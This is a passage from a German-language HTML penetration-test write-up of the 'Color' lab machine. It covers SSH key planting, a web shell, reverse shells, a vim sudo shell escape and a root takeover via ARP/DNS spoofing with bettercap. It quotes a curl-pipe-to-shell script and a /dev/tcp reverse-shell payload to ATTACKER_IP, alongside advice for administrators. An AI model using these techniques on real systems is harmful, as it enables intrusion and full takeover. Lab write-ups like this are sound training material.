+             <p class="analysis"><strong>Analyse:</strong> Die vorbereitete `authorized_keys`-Datei wird erfolgreich in das `.ssh`-Verzeichnis des Benutzers `pink` auf dem FTP-Server hochgeladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Vorbereitung für den SSH-Login als `pink` mittels Schlüssel ist abgeschlossen.</p>
+
+            <p class="analysis"><strong>Schritt 4: SSH-Login-Versuch</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">ssh pink@color.hmv -i /root/.ssh/id_rsa</span></div>
+                    <pre>
+Enter passphrase for key '/root/.ssh/id_rsa': <span class="password">[Passphrase eingegeben]</span>
+Linux color 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+[...]
+Last login: Sat Feb 11 19:16:48 2023 from 192.168.1.86
+<span class="prompt" style="color: yellow;">pink@color:~$</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der SSH-Login als `pink` wird mit dem privaten Schlüssel des Angreifers (`-i /root/.ssh/id_rsa`) versucht. Die Passphrase für den *privaten Schlüssel* wird abgefragt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der SSH-Login als `pink` mittels Schlüsselauthentifizierung war erfolgreich.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration als `pink`. Führen Sie `sudo -l` aus, suchen Sie nach SUID-Dateien etc.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins und `authorized_keys`-Änderungen.</p>
+         </section>
+
+         <section id="web-shell-rce">
+             <h2>Web Shell / RCE (www-data)</h2>
+             <p class="analysis"><strong>Kontext:</strong> Obwohl bereits SSH-Zugriff als `pink` besteht, wird im Log ein anderer Weg gezeigt: Das Platzieren und Ausführen einer Webshell, um eine Shell als `www-data` zu erlangen. Dies könnte ein alternativer Pfad oder ein separater Test sein.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">pink@color:~$</span> <span class="command">find / -type f -perm -4000 2>/dev/null</span></div>
+                     <pre>[...] <span class="comment"><!-- Standard SUID Binaries --></span></pre>
+                     <div class="prompt" style="color: yellow;">pink@color:~$</span> <span class="command">ls</span></div>
+                     <pre>authorized_keys  note.txt  seized.png  shell.php</pre>
+                     <div class="prompt" style="color: yellow;">pink@color:~$</span> <span class="command">mv shell.php /var/www/html/</span></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `pink` wird eine SUID-Suche durchgeführt (ohne besondere Ergebnisse). Die `shell.php` (die zuvor im FTP-Listing des Home-Verzeichnisses gesehen wurde) wird in das Web-Root-Verzeichnis (`/var/www/html/`) verschoben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Webshell wird im Web-Root platziert, um sie über den Browser oder `curl` aufrufen zu können.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">pink@color:~$</span> <span class="command">cd /var/www/html/</span></div>
+                     <div class="prompt" style="color: yellow;">pink@color:/var/www/html$</span> <span class="command">ls -la</span></div>
+                     <pre>
+drwxrwxrwx 2 www-data www-data   4096 Apr  6 02:00 .
+drwxr-xr-x 3 root     root       4096 Jan 27 20:21 ..
+-rw-r--r-- 1 www-data www-data    295 Jan 27 20:43 index.html
+-rw-r--r-- 1 www-data www-data  10701 Jan 27 20:22 index.html.bak
+-rw-r--r-- 1 www-data www-data 821574 Jan 27 20:34 seized.png
+<span class="command">-rw------- 1 pink     pink       5492 Apr  6 02:00 shell.php</span>
+</pre>
+                     <div class="prompt" style="color: yellow;">pink@color:/var/www/html$</span> <span class="command">chmod 777 shell.php</span></div>
+                     <div class="prompt" style="color: yellow;">pink@color:/var/www/html$</span> <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+<span class="command">-rwxrwxrwx 1 pink     pink       5492 Apr  6 02:00 shell.php</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Berechtigungen von `shell.php` werden auf `777` (lesbar, schreibbar, ausführbar für alle) gesetzt. Dies ist notwendig, damit der Apache-Prozess (der als `www-data` läuft) das Skript ausführen kann.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Webshell ist nun über HTTP erreichbar und ausführbar.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie `http://192.168.2.120/shell.php` auf (mit einem `cmd`-Parameter für RCE oder so konfiguriert, dass sie eine Reverse Shell sendet).<br><strong>Empfehlung (Admin):</strong> Setzen Sie korrekte, restriktive Berechtigungen für Dateien im Web-Root. Überwachen Sie das Web-Root auf verdächtige Dateien.</p>
+
+             <p class="analysis"><strong>Reverse Shell als www-data:</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.114] from (UNKNOWN) [192.168.2.120] 56738</span>
+[...]
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+/bin/sh: 0: can't access tty; job control turned off
+<span class="prompt" style="color: yellow;">$</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Listener wird auf Port 9001 gestartet. Nach dem Aufruf von `shell.php` (impliziert) geht eine Verbindung ein, und eine Shell als `www-data` wird erhalten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche RCE und Shell als `www-data` über die platzierte Webshell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell. Führen Sie `sudo -l` für `www-data` aus.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Webshell. Sichern Sie die Upload-/Schreibberechtigungen.</p>
+
+             <p class="analysis"><strong>Shell-Stabilisierung (wie zuvor):</strong></p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt" style="color: yellow;">$</span> <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                      <div class="prompt" style="color: yellow;">www-data@color:/$</span> <span class="command">export TERM=xterm</span></div>
+                      <div class="prompt" style="color: yellow;">www-data@color:/$</span> <span class="command">^Z</span></div>
+                  </div>
+              </div>
+               <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                      <pre>reset
+<span class="prompt" style="color: yellow;">www-data@color:/$</span></pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Die `www-data`-Shell wird stabilisiert.</p>
+
+        </section>
+
+        <section id="privesc-green-poc">
+             <h2>Privilege Escalation (www-data zu green - POC)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung einer `sudo`-Regel, die es `www-data` erlaubt, `vim` als Benutzer `green` auszuführen, um eine Shell als `green` zu erlangen.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   Shell als `www-data`.
+                 *   Die spezifische `sudo`-Regel `(green) NOPASSWD: /usr/bin/vim`.
+             </p>
+              <p class="recommendation"><strong>Risiko:</strong> Mittel bis Hoch. Ermöglicht die Übernahme des `green`-Kontos.</p>
+
+             <p class="analysis"><strong>Schritt 1: sudo-Regel prüfen</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@color:/$</span> <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for www-data on color:
+    env_reset, mail_badpass, secure_path=...
+
+User www-data may run the following commands on color:
+    <span class="password">(green) NOPASSWD: /usr/bin/vim</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `sudo -l` zeigt, dass `www-data` den Befehl `/usr/bin/vim` als Benutzer `green` ohne Passwort ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine bekannte Fehlkonfiguration. Editoren wie `vim` erlauben oft das Ausführen von Shell-Befehlen aus dem Editor heraus (siehe GTFOBins).</p>
+
+             <p class="analysis"><strong>Schritt 2: vim zur Shell-Eskalation nutzen</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@color:/$</span> <span class="command">sudo -u green vim -c ':!/bin/sh'</span></div>
+                     <pre>
+/bin/sh: 1: 	id: not found <span class="comment"><!-- Irrelevante Fehlermeldung von vim/sh --></span>
+<span class="prompt" style="color: yellow;">$</span> <span class="command">id</span>
+<span class="command">uid=1127(green) gid=1127(green) groups=1127(green)</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> `vim` wird mit `sudo -u green` gestartet. Die Option `-c ':!/bin/sh'` weist `vim` an, sofort nach dem Start den Ex-Befehl `:!/bin/sh` auszuführen. Das `:!` führt einen externen Shell-Befehl aus, hier `/bin/sh`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Eine Shell wird gestartet, und der `id`-Befehl bestätigt, dass sie als Benutzer `green` läuft.</p>
+              <p class="recommendation"><strong>Empfehlung (Admin):</strong> Erlauben Sie niemals die Ausführung von Editoren oder anderen Programmen, die Shell-Escapes ermöglichen, mit `sudo`, insbesondere nicht als andere Benutzer. Verwenden Sie sicherere Alternativen oder beschränken Sie die ausführbaren Befehle stark.</p>
+
+              <p class="analysis"><strong>Enumeration als `green`:</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">green@color:/$</span> <span class="command">sudo -l</span></div>
+                     <pre>[sudo] password for green:</pre>
+                 </div>
+             </div>
+               <p class="analysis"><strong>Analyse:</strong> `green` hat keine `sudo`-Rechte ohne Passwort.</p>
+
+        </section>
+
+         <section id="lateral-movement-purple">
+             <h2>Lateral Movement (green zu purple)</h2>
+              <p class="analysis"><strong>Kontext:</strong> Als `green` wird nach Wegen gesucht, um weitere Rechte oder Zugriff auf andere Benutzer zu erlangen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh green@color.hmv -i /root/.ssh/id_rsa</span></div>
+                     <pre>Enter passphrase for key '/root/.ssh/id_rsa': [Passphrase]
+<span class="prompt" style="color: yellow;">green@color:~$</span></pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Es wird eine direkte SSH-Verbindung als `green` hergestellt. Dies impliziert, dass der öffentliche Schlüssel des Angreifers zuvor auch für `green` in dessen `authorized_keys` platziert wurde (dieser Schritt ist nicht explizit im Log gezeigt, aber wahrscheinlich notwendig).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Ermöglicht eine stabilere Shell als `green`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">green@color:~$</span> <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+-rw-r--r-- 1 root root    145 Feb 11 16:42 note.txt
+<span class="command">-rwxr-xr-x 1 root root  16928 Feb 11 19:29 test_4_green</span>
+[...]
+</pre>
+                     <div class="prompt" style="color: yellow;">green@color:~$</span> <span class="command">nano ccc.py</span></div> <span class="comment"><!-- Python-Skript erstellen --></span>
+                     <div class="prompt" style="color: yellow;">green@color:~$</span> <span class="command">chmod +x ccc.py</span></div>
+                     <pre>[Berechtigungen gesetzt]</pre>
+                     <div class="prompt" style="color: yellow;">green@color:~$</span> <span class="command">cat ccc.py</span></div>
+                    <pre>
+#!/usr/bin/python3
+
+import subprocess
+import random
+
+while True:
+    n = random.randint(1, 1000000)
+    process = subprocess.run(["./test_4_green"], input=str(n) ,text=True, capture_output=True)
+
+    if "Correct!!" in process.stdout:
+        print(f"Number found {n}")
+        print(process.stdout)
+        break
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `green` wird eine ausführbare Datei `test_4_green` gefunden, die `root` gehört. Ein Python-Skript (`ccc.py`) wird erstellt, das in einer Schleife zufällige Zahlen generiert, sie als Eingabe an `./test_4_green` übergibt und prüft, ob die Ausgabe "Correct!!" enthält.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> `test_4_green` scheint ein "Rate die Zahl"-Spiel zu sein. Das Python-Skript automatisiert das Raten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">green@color:~$</span> <span class="command">python3 ccc.py</span></div>
+                     <pre>
+Number found 530149
+Guess the number im thinking: Correct!! Here is the pass:
+<span class="password">purpleaslilas</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Das Python-Skript findet die korrekte Zahl (530149) und das Programm `test_4_green` gibt daraufhin ein Passwort preis: `<span class="password">purpleaslilas</span>`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Ein Passwort, vermutlich für den Benutzer `purple`, wurde durch das Lösen des Rätsels erhalten.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `su purple` und dem Passwort `purpleaslilas` als Benutzer `purple` anzumelden.<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter im Klartext als Ausgabe von Programmen, selbst wenn diese versteckt oder als Belohnung gedacht sind. Entfernen Sie das `test_4_green`-Programm oder sichern Sie es.</p>
+
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">green@color:~$</span> <span class="command">su purple</span></div>
+                     <pre>Password: <span class="password">purpleaslilas</span>
+<span class="prompt" style="color: yellow;">purple@color:/home/green$</span></pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Wechsel zum Benutzer `purple` mit dem gefundenen Passwort ist erfolgreich.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Lateral Movement zu `purple` gelungen.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie als `purple`. Führen Sie `sudo -l` aus.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Notwendigkeit des `purple`-Kontos und dessen Berechtigungen.</p>
+
+               <p class="analysis"><strong>Enumeration als `purple`:</strong></p>
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">purple@color:/home/green$</span> <span class="command">cd ~</span></div>
+                     <div class="prompt" style="color: yellow;">purple@color:~$</span> <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+-rw-r--r-- 1 root   root     77 Feb 11 17:03 for_purple_only.txt
+<span class="command">-rw-r--r-- 1 root   root     14 Feb 11 16:52 user.txt</span>
+[...]
+</pre>
+                     <div class="prompt" style="color: yellow;">purple@color:~$</span> <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">(:Ez_Colors:)</span></pre>
+                     <div class="prompt" style="color: yellow;">purple@color:~$</span> <span class="command">cat for_purple_only.txt</span></div>
+                     <pre>
+As the highest level user I allow you to use the
+supreme ddos attack script.
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `purple` wird die `user.txt` gefunden und gelesen (enthält "(Ez_Colors)"). Eine weitere Datei `for_purple_only.txt` erwähnt ein "ddos attack script".</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag gefunden (obwohl sie anders aussieht als die zuvor gefundene `34f35...`). Der Hinweis auf das DDoS-Skript ist wichtig.</p>
+
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">purple@color:~$</span> <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for purple on color:
+    env_reset, mail_badpass, secure_path=...
+
+User purple may run the following commands on color:
+    <span class="password">(root) NOPASSWD: /attack_dir/ddos.sh</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` für `purple` zeigt, dass dieser Benutzer das Skript `/attack_dir/ddos.sh` als `root` ohne Passwort ausführen darf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein klarer Weg zur Root-Eskalation!</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt von `/attack_dir/ddos.sh` und finden Sie heraus, wie Sie dessen Ausführung als `root` missbrauchen können.<br><strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist extrem gefährlich. Erlauben Sie niemals die Ausführung von Skripten als Root über `sudo`, wenn der Benutzer das Skript oder dessen Umgebung beeinflussen kann.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">purple@color:~$</span> <span class="command">cat /attack_dir/ddos.sh</span></div>
+                    <pre>
+#!/bin/bash
+<span class="command">/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Skript `ddos.sh` verwendet `curl`, um ein weiteres Skript (`attack.sh`) von der URL `http://masterddos.hmv/attack.sh` herunterzuladen und dessen Inhalt direkt an eine Shell (`/usr/bin/sh -p`) zur Ausführung weiterzuleiten. Die Option `-p` bei `sh` versucht, die effektive UID beizubehalten (obwohl dies hier nicht den entscheidenden Unterschied macht, da das gesamte Skript bereits als Root läuft).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine klassische Schwachstelle. Da `purple` das Skript als `root` ausführen darf, wird das von `masterddos.hmv` heruntergeladene Skript ebenfalls als `root` ausgeführt. Wenn der Angreifer die DNS-Auflösung für `masterddos.hmv` auf seinen eigenen Server umleiten kann, kann er beliebigen Code als Root ausführen lassen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Richten Sie DNS-Spoofing (z.B. mit `bettercap`) ein, um Anfragen für `masterddos.hmv` auf Ihren eigenen Webserver umzuleiten. Erstellen Sie auf Ihrem Webserver eine Datei `attack.sh`, die einen Reverse-Shell-Payload enthält. Führen Sie dann `sudo /attack_dir/ddos.sh` als `purple` aus.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie das Herunterladen und Ausführen von Skripten von externen Quellen innerhalb von Skripten, die mit erhöhten Rechten laufen. Validieren Sie heruntergeladene Inhalte. Verwenden Sie interne, vertrauenswürdige Quellen.</p>
+
+         </section>
+
+          <section id="privesc-root-poc">
+             <h2>Privilege Escalation (purple zu root - POC)</h2>
+              <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung der `sudo`-Regel für `ddos.sh` in Kombination mit DNS-Spoofing, um eine Root-Shell zu erlangen.</p>
+              <p class="evaluation"><strong>Voraussetzungen:</strong>
+                  *   Shell als `purple`.
+                  *   Die `sudo`-Regel `(root) NOPASSWD: /attack_dir/ddos.sh`.
+                  *   Ein Angreifer-System im selben Netzwerk mit:
+                      *   Einem Webserver (z.B. Python HTTP Server).
+                      *   Einem Netcat-Listener.
+                      *   Einem DNS-Spoofing-Tool (z.B. `bettercap`) mit ARP-Spoofing-Fähigkeit.
+                  *   Eine Datei `attack.sh` auf dem Webserver des Angreifers mit einem Reverse-Shell-Payload.
+              </p>
+               <p class="recommendation"><strong>Risiko:</strong> Kritisch. Ermöglicht die vollständige Übernahme des Systems durch Ausführung beliebigen Codes als Root.</p>
+
+              <p class="analysis"><strong>Schritt 1: Setup auf Angreifer-System (Mehrere Terminals)</strong></p>
+              <ul>
+                  <li>**Terminal 2 (Webserver):** Startet einen Python-Webserver auf Port 80, der die Datei `attack.sh` bereitstellt (Inhalt von `attack.sh` nicht gezeigt, muss aber Reverse Shell enthalten, z.B. `#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/9002 0>&1`).</li>
+                  <li>**Terminal 4 (Listener):** Startet einen Netcat-Listener auf Port 9002, um die Root-Shell zu empfangen.</li>
+                  <li>**Terminal 3 (DNS/ARP Spoofing):** `bettercap` wird konfiguriert:
+                      *   ARP-Spoofing wird aktiviert (`arp.spoof on`), um den Netzwerkverkehr des Opfers (`192.168.2.119` - IP des Opfers im Log, sollte `192.168.2.120` sein) über den Angreifer zu leiten.
+                      *   DNS-Spoofing wird aktiviert (`dns.spoof on`), um Anfragen für `masterddos.hmv` mit der IP des Angreifers (`192.168.2.114`) zu beantworten.</li>
+              </ul>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Terminal 2] ┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Terminal 4] ┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9002</span></div>
+                     <pre>listening on [any] 9002 ...</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Terminal 3] ┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">bettercap</span></div>
+                     <pre>
+bettercap v2.32.0 [...]
+192.168.2.0/24 > 192.168.2.114  » <span class="command">set arp.spoof.targets 192.168.2.120</span> <span class="comment"><!-- Ziel IP --></span>
+192.168.2.0/24 > 192.168.2.114  » <span class="command">set dns.spoof.address 192.168.2.114</span> <span class="comment"><!-- Angreifer IP --></span>
+192.168.2.0/24 > 192.168.2.114  » <span class="command">set dns.spoof.all true</span>
+192.168.2.0/24 > 192.168.2.114  » <span class="command">set dns.spoof.domains masterddos.hmv</span>
+192.168.2.0/24 > 192.168.2.114  » <span class="command">dns.spoof on</span>
+192.168.2.0/24 > 192.168.2.114  » <span class="command">arp.spoof on</span>
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Setup für den Man-in-the-Middle-Angriff (ARP-Spoofing) und die DNS-Umleitung ist abgeschlossen.</p>
+
+             <p class="analysis"><strong>Schritt 2: Exploit ausführen (Opfer-System, Terminal 1)</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Terminal 1] purple@color:~$</span> <span class="command">sudo -u root /attack_dir/ddos.sh</span></div>
+                     <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: masterddos.hmv
+</pre> <span class="comment"><!-- Erster Versuch schlägt fehl --></span>
+                     <div class="prompt">[Terminal 1] purple@color:~$</span> <span class="command">sudo -u root /attack_dir/ddos.sh</span></div>
+                     <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    82  100    82    0     0   2000      0 --:--:-- --:--:-- --:--:--  2000 <span class="comment"><!-- Erfolg! --></span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `sudo`-Befehl wird als `purple` mehrfach ausgeführt. Die ersten Versuche schlagen fehl (möglicherweise dauert es kurz, bis ARP/DNS-Spoofing greift). Beim erfolgreichen Versuch lädt `curl` das Skript `attack.sh` vom Angreifer-Webserver (da `masterddos.hmv` auf die Angreifer-IP aufgelöst wird) und führt es mit `sh -p` als Root aus.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Exploit wurde erfolgreich ausgelöst.</p>
+
+            <p class="analysis"><strong>Schritt 3: Ergebnisse auf Angreifer-System</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Terminal 2 - Webserver] ┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+<span class="password">192.168.2.120 - - [06/Apr/2023 23:28:31] "GET /attack.sh HTTP/1.1" 200 -</span> <span class="comment"><!-- Opfer lädt attack.sh --></span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Terminal 3 - Bettercap] 192.168.2.0/24 > 192.168.2.114</span> <span class="command">»</span></div>
+                     <pre>[...] [sys.log] [inf] dns.spoof sending spoofed DNS reply for masterddos.hmv (->192.168.2.114) to 192.168.2.120 [...]</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Terminal 4 - Listener] ┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9002</span></div>
+                     <pre>
+listening on [any] 9002 ...
+<span class="password">connect to [192.168.2.114] from (UNKNOWN) [192.168.2.120] 53114</span>
+<span class="prompt" style="color: red;">#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="prompt" style="color: red;">#</span> <span class="command">ip a</span>
+192.168.2.119 <span class="comment"><!-- Bestätigt IP des Opfers 192.168.2.120 --></span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Webserver (Terminal 2) zeigt den erfolgreichen Download von `attack.sh` durch das Opfer. Bettercap (Terminal 3) zeigt die erfolgreiche DNS-Umleitung. Der Netcat-Listener (Terminal 4) empfängt die Verbindung und stellt eine Root-Shell bereit.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritische Privilegienerweiterung zu Root erfolgreich durchgeführt!</p>
+              <p class="recommendation"><strong>Empfehlung (Admin):</strong> Beheben Sie die unsichere `sudo`-Regel für `ddos.sh`. Implementieren Sie Schutzmaßnahmen gegen ARP- und DNS-Spoofing im Netzwerk (z.B. dynamische ARP-Inspektion, DNSSEC, sichere DNS-Server).</p>
+
+         </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/purple/user.txt</div>
+                     <div class="flag-value"><span class="password">(:Ez_Colors:)</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">Root Flag (aus Log extrahiert)</div>
+                     <div class="flag-value"><span class="password">(:go_play_some_minecraft:)</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 06. April 2023</p>
+    </footer>
+</body>
+</html>
